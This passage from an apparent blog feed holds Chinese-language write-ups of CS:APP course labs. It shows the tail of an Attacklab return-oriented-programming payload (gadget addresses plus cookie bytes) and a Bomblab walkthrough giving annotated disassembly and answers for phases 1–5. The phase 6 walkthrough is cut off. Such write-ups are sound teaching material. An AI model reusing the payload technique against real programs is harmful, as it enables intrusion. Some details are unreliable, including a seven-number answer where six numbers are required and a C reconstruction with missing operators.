lea (%rdi,%rsi,1),%rax *&#x2F;</span><br><span class="line">a2 19 40 00 00 00 00 00 &#x2F;* mov $rax,$rdi *&#x2F;</span><br><span class="line">fa 18 40 00 00 00 00 00 &#x2F;* touch3 地址 *&#x2F;</span><br><span class="line">35 39 62 39 39 37 66 61 00 &#x2F;* cookie value *&#x2F;</span><br></pre></td></tr></table></figure><p>一个小tip: offset不用手算, 最先可以随便设置一个值,gdb debug到进入到我们的注入代码时候, 执行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x &#x2F;100xb $rsp</span><br></pre></td></tr></table></figure><p>就可以看到cooike value所在的内存地址, 然后 用这个地址 - $rsp即可得到offset, 最后再修改一次攻击代码即可.</p><h2 id="6-尾语"><a href="#6-尾语" class="headerlink" title="6. 尾语"></a>6. 尾语</h2><p>这一个实验和上一个bomlab实验隔了整整一个月才做, 不过整体坐下来比bomblab简单得多, 总体来说, 加强了gdb调试能力, 加深对函数调用的过程, 了解了一些常用的代码注入攻击手段, 能够帮助我们写出更安全,健壮的代码.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;csapp lab系列：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.ravenxrz.ink/archives/2d758396.html&quot;&gt;Csapp-Datalab 详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.ravenxrz.ink/archives/7915569e.html&quot;&gt;Csapp-Bomblab 题解&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本次lab: Attacklab&lt;/p&gt;
&lt;p&gt;耽误了整整一个月没有做csapp的lab了. 忙着返校,忙着实验室的东西, 今天抽了点时间,总算是完成了第三个实验.&lt;/p&gt;
&lt;p&gt;下面就记录下题解分析吧.&lt;/p&gt;
    
    </summary>
    
    
      <category term="Csapp" scheme="https://www.ravenxrz.ink/categories/Csapp/"/>
    
    
      <category term="Attacklab" scheme="https://www.ravenxrz.ink/tags/Attacklab/"/>
    
  </entry>
  
  <entry>
    <title>Csapp-Bomblab题解</title>
    <link href="https://www.ravenxrz.ink/archives/7915569e.html"/>
    <id>https://www.ravenxrz.ink/archives/7915569e.html</id>
    <published>2020-06-21T15:06:10.000Z</published>
    <updated>2020-09-06T07:37:36.748Z</updated>
    
    <content type="html"><![CDATA[<p>今天继续学习csapp.</p><p>前一个lab: <a href="https://www.ravenxrz.ink/archives/2d758396.html">Csapp-Datalab 详解 </a></p><p>本次lab, bomblab.</p><h2 id="0-说明"><a href="#0-说明" class="headerlink" title="0. 说明"></a>0. 说明</h2><p> 这个实验相当好玩, 题如其名, 类似一个拆炸弹的过程. 实验只给了一个可执行文件, 需要学生通过gdb反汇编这个可执行文件, “拆弹”共有6个阶段, 每个阶段需要用户输入一个特定的字符串, 一旦输入错误, 炸弹就会爆炸,程序终止.</p><p>做完整个实验, <strong>学生可以学会如何使用gdb, 能够看懂 gcc所编译出来的汇编代码. 掌握阅读汇编代码的能力.</strong></p><p>gdb的使用可参考: <a href="https://www.ravenxrz.ink/archives/37784c45.html">gdb 调试基础 </a></p><p><strong>本次解释, 均已代码注释+图形解释.</strong></p><p><strong>所有汇编代码, 可通过 objdump -d bomb获得.</strong></p><a id="more"></a><h2 id="1-phase-1"><a href="#1-phase-1" class="headerlink" title="1. phase 1"></a>1. phase 1</h2><p>下面是phase 1的汇编代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">   400ee0:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">   400ee4:   be 00 24 40 00          mov    $0x402400,%esi             ; 0x402400是重点</span><br><span class="line">   400ee9:   e8 4a 04 00 00          callq  401338 &lt;strings_not_equal&gt; ; 根据函数可知, 这里要比较两个字符串是否相同</span><br><span class="line">   400eee:   85 c0                   test   %eax,%eax</span><br><span class="line">   400ef0:   74 05                   je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">   400ef2:   e8 43 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">   400ef7:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">   400efb:   c3                      retq   </span><br></pre></td></tr></table></figure><p>所以,我们需要查看内存地址 0x402400的字符串是什么, 通过 <code>x /100cb 0x402400</code>命令,可得:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621205547340.png" alt="image-20200621205547340"></p><p>找到 <code>\0</code>的位置, 之前所有的字符组成的字符串即为答案:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br></pre></td></tr></table></figure><h2 id="2-phase-2"><a href="#2-phase-2" class="headerlink" title="2. phase 2"></a>2. phase 2</h2><p>源代码和注释:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:   55                      push   %rbp</span><br><span class="line">  400efd:   53                      push   %rbx</span><br><span class="line">  400efe:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  400f02:   48 89 e6                mov    %rsp,%rsi</span><br><span class="line">  400f05:   e8 52 05 00 00          callq  40145c &lt;read_six_numbers&gt;    ;重点在这个函数, 内部采用sscanf实现</span><br><span class="line">  400f0a:   83 3c 24 01             cmpl   $0x1,(%rsp)                  ;输入的第一值必须为1</span><br><span class="line">  400f0e:   74 20                   je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:   e8 25 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:   eb 19                   jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:   8b 43 fc                mov    -0x4(%rbx),%eax              ; 这里为 x_&#123;i&#125;</span><br><span class="line">  400f1a:   01 c0                   add    %eax,%eax                    ; x_&#123;i&#125;&#x3D;2*x_&#123;i&#125;,将当前值加倍</span><br><span class="line">  400f1c:   39 03                   cmp    %eax,(%rbx)                  ; 这里 为x_&#123;i+1&#125;, </span><br><span class="line">  400f1e:   74 05                   je     400f25 &lt;phase_2+0x29&gt;        ; 要求 x_&#123;i+1&#125; &#x3D; x&#123;i&#125;, 结合这三行代码, 要求为,上一个数的2倍&#x3D;下一个数 </span><br><span class="line">  400f20:   e8 15 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:   48 83 c3 04             add    $0x4,%rbx</span><br><span class="line">  400f29:   48 39 eb                cmp    %rbp,%rbx</span><br><span class="line">  400f2c:   75 e9                   jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:   eb 0c                   jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:   48 8d 5c 24 04          lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:   48 8d 6c 24 18          lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:   eb db                   jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:   48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  400f40:   5b                      pop    %rbx</span><br><span class="line">  400f41:   5d                      pop    %rbp</span><br><span class="line">  400f42:   c3                      retq                                                </span><br></pre></td></tr></table></figure><p>这个题的重点有两个:</p><ol><li>函数 read_sim_numers. 内部sscanf实现. 从函数名也可一直,本题要求输入值的数量为6.</li><li>指令地址 0x400f17开始的地方, 结合这里的4行代码, 可以推断,本题要求输入值的约束为:</li></ol><p>$$<br>x_{i} \times 2 = x_{i+1} \quad i = {0\dots5}<br>$$</p><p>且 0x400f0a要求第一个参数为1.</p><p>所以,答案为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 2 4 8 16 32 64</span><br></pre></td></tr></table></figure><h2 id="3-phase-3"><a href="#3-phase-3" class="headerlink" title="3. phase 3"></a>3. phase 3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:   48 83 ec 18             sub    $0x18,%rsp</span><br><span class="line">  400f47:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:   48 8d 54 24 08          lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:   be cf 25 40 00          mov    $0x4025cf,%esi</span><br><span class="line">  400f56:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  400f5b:   e8 90 fc ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:   83 f8 01                cmp    $0x1,%eax            ; 输入参数的数量应该&gt;1</span><br><span class="line">  400f63:   7f 05                   jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:   e8 d0 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:   83 7c 24 08 07          cmpl   $0x7,0x8(%rsp)       ; 0x80(rsp)地址空间的value : 0x7</span><br><span class="line">  400f6f:   77 3c                   ja     400fad &lt;phase_3+0x6a&gt; ; 是否符号小</span><br><span class="line">  400f71:   8b 44 24 08             mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:   ff 24 c5 70 24 40 00    jmpq   *0x402470(,%rax,8)</span><br><span class="line">  400f7c:   b8 cf 00 00 00          mov    $0xcf,%eax</span><br><span class="line">  400f81:   eb 3b                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:   b8 c3 02 00 00          mov    $0x2c3,%eax</span><br><span class="line">  400f88:   eb 34                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:   b8 00 01 00 00          mov    $0x100,%eax</span><br><span class="line">  400f8f:   eb 2d                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:   b8 85 01 00 00          mov    $0x185,%eax</span><br><span class="line">  400f96:   eb 26                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:   b8 ce 00 00 00          mov    $0xce,%eax</span><br><span class="line">  400f9d:   eb 1f                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:   b8 aa 02 00 00          mov    $0x2aa,%eax</span><br><span class="line">  400fa4:   eb 18                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:   b8 47 01 00 00          mov    $0x147,%eax</span><br><span class="line">  400fab:   eb 11                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:   e8 88 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  400fb7:   eb 05                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:   b8 37 01 00 00          mov    $0x137,%eax          </span><br><span class="line">  400fbe:   3b 44 24 0c             cmp    0xc(%rsp),%eax       ; 0x137 : 0x($rsp) , 通过x打印命令,可知0x($rsp)就是要求输入的第二参数</span><br><span class="line">  400fc2:   74 05                   je     400fc9 &lt;phase_3+0x86&gt; ; 所以第二参数为0x137</span><br><span class="line">  400fc4:   e8 71 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:   48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">  400fcd:   c3                      retq </span><br></pre></td></tr></table></figure><p>这里注意三个点:</p><ol><li>输入的字段数&gt;1</li><li>第二个参数为0x137, 在指令地址为0x400fbe地方可见.</li></ol><p>答案:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 311</span><br></pre></td></tr></table></figure><h2 id="4-phase-4"><a href="#4-phase-4" class="headerlink" title="4. phase 4"></a>4. phase 4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">   400fce:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">   400fd2:   89 d0                   mov    %edx,%eax</span><br><span class="line">   400fd4:   29 f0                   sub    %esi,%eax            ; 第一次, eax&#x3D;17; 第二次进入, </span><br><span class="line">   400fd6:   89 c1                   mov    %eax,%ecx            ; 第一次进入时, ecx &#x3D; 14</span><br><span class="line">   400fd8:   c1 e9 1f                shr    $0x1f,%ecx           ; 第一次进入时, ecx &#x3D; 0</span><br><span class="line">   400fdb:   01 c8                   add    %ecx,%ea</span><br><span class="line">   400fdd:   d1 f8                   sar    %eax                 ; 第一次进入时, ecx &#x3D; 7</span><br><span class="line">   400fdf:   8d 0c 30                lea    (%rax,%rsi,1),%ecx   ; 第一次进入时, ecx &#x3D; 7</span><br><span class="line">   400fe2:   39 f9                   cmp    %edi,%ecx            ; ecx : edi</span><br><span class="line">   400fe4:   7e 0c                   jle    400ff2 &lt;func4+0x24&gt;  ; ecx &lt;&#x3D; edi</span><br><span class="line">   400fe6:   8d 51 ff                lea    -0x1(%rcx),%edx      ; 第一次进入,ecdx &#x3D; 6</span><br><span class="line">   400fe9:   e8 e0 ff ff ff          callq  400fce &lt;func4&gt;       ; 递归调用</span><br><span class="line">   400fee:   01 c0                   add    %eax,%eax            </span><br><span class="line">   400ff0:   eb 15                   jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">   400ff2:   b8 00 00 00 00          mov    $0x0,%eax           ; eax  &#x3D; 0 </span><br><span class="line">   400ff7:   39 f9                   cmp    %edi,%ecx           ; ecx : edi</span><br><span class="line">   400ff9:   7d 0c                   jge    401007 &lt;func4+0x39&gt; ; ecx &gt;&#x3D; edi 结合上面 ecx &lt;&#x3D;edi &#x3D;&#x3D;&gt; ecx &#x3D; edi, 最后一层应该在这里返回, 而前文已经推断得到ecx&#x3D;7</span><br><span class="line">   400ffb:   8d 71 01                lea    0x1(%rcx),%esi</span><br><span class="line">   400ffe:   e8 cb ff ff ff          callq  400fce &lt;func4&gt;</span><br><span class="line">   401003:   8d 44 00 01             lea    0x1(%rax,%rax,1),%eax    ; 最后一层返回eax时,eax 应该&#x3D;0</span><br><span class="line">   401007:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">   40100b:   c3                      retq</span><br><span class="line">   </span><br><span class="line"> 000000000040100c &lt;phase_4&gt;:</span><br><span class="line">   40100c:   48 83 ec 18             sub    $0x18,%rsp</span><br><span class="line">   401010:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx</span><br><span class="line">   401015:   48 8d 54 24 08          lea    0x8(%rsp),%rdx</span><br><span class="line">   40101a:   be cf 25 40 00          mov    $0x4025cf,%esi</span><br><span class="line">   40101f:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">   401024:   e8 c7 fb ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   401029:   83 f8 02                cmp    $0x2,%eax            ; 需要输入2个参数</span><br><span class="line">   40102c:   75 07                   jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">   40102e:   83 7c 24 08 0e          cmpl   $0xe,0x8(%rsp)</span><br><span class="line">   401033:   76 05                   jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">   401035:   e8 00 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">   40103a:   ba 0e 00 00 00          mov    $0xe,%edx            ; 构造函数参数3</span><br><span class="line">   40103f:   be 00 00 00 00          mov    $0x0,%esi            ; 构造函数参数2</span><br><span class="line">   401044:   8b 7c 24 08             mov    0x8(%rsp),%edi       ; 构造函数参数1 edi&#x3D;输入的第一个参数</span><br><span class="line">   401048:   e8 81 ff ff ff          callq  400fce &lt;func4&gt;       ; 进入func4函数</span><br><span class="line">   40104d:   85 c0                   test   %eax,%eax            ; 这行和下一行,要求func4返回的参数一定等于0</span><br><span class="line">   40104f:   75 07                   jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">   401051:   83 7c 24 0c 00          cmpl   $0x0,0xc(%rsp)       ; 第二参数为0</span><br><span class="line">   401056:   74 05                   je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">   401058:   e8 dd 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">   40105d:   48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">   401061:   c3                      retq</span><br></pre></td></tr></table></figure><p>这是一个递归题目, 难点在参数1, 参数2的确定非常简单,直接为0.</p><p>而参数1,则需要带入到代码中,还原递归的过程.</p><p>还原为递归代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = z - y;</span><br><span class="line">    <span class="keyword">int</span> k = t  <span class="number">31</span>;</span><br><span class="line">    t = (t + k)  <span class="number">1</span>;</span><br><span class="line">    k = t + y;</span><br><span class="line">    <span class="keyword">if</span>(k &lt;= x) &#123;</span><br><span class="line">        t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(k &gt;= x) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            y = k + <span class="number">1</span>;</span><br><span class="line">            func4(x, y, z);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        z = k - <span class="number">1</span>;</span><br><span class="line">        func4(x, y, z);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终可注意到, x = 7 3 1都可以.</p><p>答案:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7 0 或 3 0 或 1 0</span><br></pre></td></tr></table></figure><h2 id="5-phase-5"><a href="#5-phase-5" class="headerlink" title="5. phase 5"></a>5. phase 5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:   53                      push   %rbx</span><br><span class="line">  401063:   48 83 ec 20             sub    $0x20,%rsp</span><br><span class="line">  401067:   48 89 fb                mov    %rdi,%rbx</span><br><span class="line">  40106a:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line">  401071:   00 00 </span><br><span class="line">  401073:   48 89 44 24 18          mov    %rax,0x18(%rsp</span><br><span class="line">  401078:   31 c0                   xor    %eax,%eax</span><br><span class="line">  40107a:   e8 9c 02 00 00          callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:   83 f8 06                cmp    $0x6,%eax            ; 输入6个字段</span><br><span class="line">  401082:   74 4e                   je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:   e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:   eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  -----------------------使用坐标 start-----------------------------------</span><br><span class="line">  40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx   ; rbx存放的的是输入字符串的首地址, rax是索引下表,所以这里时将输入的每个字符传递给ecx</span><br><span class="line">  40108f:   88 0c 24                mov    %cl,(%rsp)           ;</span><br><span class="line">  401092:   48 8b 14 24             mov    (%rsp),%rdx          ; 取ecx的低16位给rdx</span><br><span class="line">  401096:   83 e2 0f                and    $0xf,%edx            ; 取ecx的低4位. </span><br><span class="line">  401099:   0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx  ;关键代码:以0x4024b0地址为基, 加上rdx偏移量,替换原有字符串. </span><br><span class="line">  4010a0:   88 54 04 10             mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">  4010a4:   48 83 c0 01             add    $0x1,%rax</span><br><span class="line">  4010a8:   48 83 f8 06             cmp    $0x6,%rax</span><br><span class="line">  4010ac:   75 dd                   jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  ----------------------使用坐标 end--------------------------------------</span><br><span class="line">  4010ae:   c6 44 24 16 00          movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:   be 5e 24 40 00          mov    $0x40245e,%esi       ; 关键代码, 查看内存地址空间0x40245e的字符串为 flyers, 比较前文获取的字符串是否等于flyers</span><br><span class="line">  4010b8:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi      ; </span><br><span class="line">  4010bd:   e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt; ;</span><br><span class="line">  4010c2:   85 c0                   test   %eax,%eax</span><br><span class="line">  4010c4:   74 13                   je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:   e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:   eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  4010d7:   eb b2                   jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:   00 00 </span><br><span class="line">  4010e7:   74 05                   je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:   e8 42 fa ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:   48 83 c4 20             add    $0x20,%rsp</span><br><span class="line">  4010f2:   5b                      pop    %rbx</span><br><span class="line">  4010f3:   c3                      retq </span><br></pre></td></tr></table></figure><p>这个题相当有意思,给我一种破译密码的感觉.</p><p>可以理解为, 当前手上有一份加密码表, 我们要找到一个合适的坐标, 通过这个坐标去, 然后去密码表上查找对应码字,使得这些码字组成等于”flyers”.</p><p>解释:</p><ul><li>坐标: 就是我们要输入的字符串的每个字符. 然后取这些字符的低4位作为坐标</li><li>密码表: 0x4024b地址空间.得到坐标后, 查看以0x4024b为首地址的字符串加上这些坐标,得到解密后的码字.</li><li>目标码: 0x40245e地址空间. 我们解密出来的码字要等于这个地址空间所拥有的字符串, 经查看,为flyers</li></ul><p>另外,值得注意的是, 以字符的低4bit作为坐标, 这样会有多个字符有相同的低4bit. 查看acsii码表.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621224830418.png" alt="image-20200621224830418"></p><p>如果以数字表示坐标,则坐标为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9 15 6 7</span><br></pre></td></tr></table></figure><p>对比acsii码:</p><p>第一个坐标9, 对应到acsii表的第9行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">) 9 I Y i y</span><br></pre></td></tr></table></figure><p>也就是说, 第一个坐标,可以是这6个字符中的任意一个.</p><p>同理,第二个坐标15, 也就是F行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; ? 0 _ o DEL</span><br></pre></td></tr></table></figure><p>最后, 个人答案:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span>/<span class="number">.567</span></span><br></pre></td></tr></table></figure><h2 id="6-phase-6"><a href="#6-phase-6" class="headerlink" title="6. phase 6"></a>6. phase 6</h2><p>phase 6是bomblab中最难的题, 我对代码做了详细的解释:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span 